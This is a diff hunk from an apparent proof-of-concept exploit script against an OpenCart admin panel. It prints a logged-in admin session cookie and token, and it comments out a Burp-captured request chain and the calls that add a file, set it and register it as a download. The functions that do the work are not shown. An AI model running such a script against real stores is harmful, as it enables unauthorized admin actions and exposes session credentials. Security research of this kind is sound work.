@@ -73,16 +73,16 @@ if __name__ == "__main__":
     n=loginad()
     adcookies=n['cookies']
     adtoken=n['token']
-    #print(adcookies)
-    #print(adtoken)
+    print(adcookies)
+    print(adtoken)
     
-    burp0_url = "https://"+host+":443//admin/index.php?route=catalog/download/add&user_token="+adtoken
-    burp0_cookies = {"OCSESSID": adcookies, "language": "en-gb", "currency": "USD"}
-    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://"+host, "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJ0kpr6vfuOQJuvkE", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
-    addfile()
-    n1=setfile()
-    n2=setdownload()
-    print("poc run ")
+    # burp0_url = "https://"+host+":443//admin/index.php?route=catalog/download/add&user_token="+adtoken
+    # burp0_cookies = {"OCSESSID": adcookies, "language": "en-gb", "currency": "USD"}
+    # burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://"+host, "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJ0kpr6vfuOQJuvkE", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
+    # addfile()
+    # n1=setfile()
+    # n2=setdownload()
+    # print("poc run ")
     
     # if (n1==200 and n2==200):
     #     print("PoC success!")
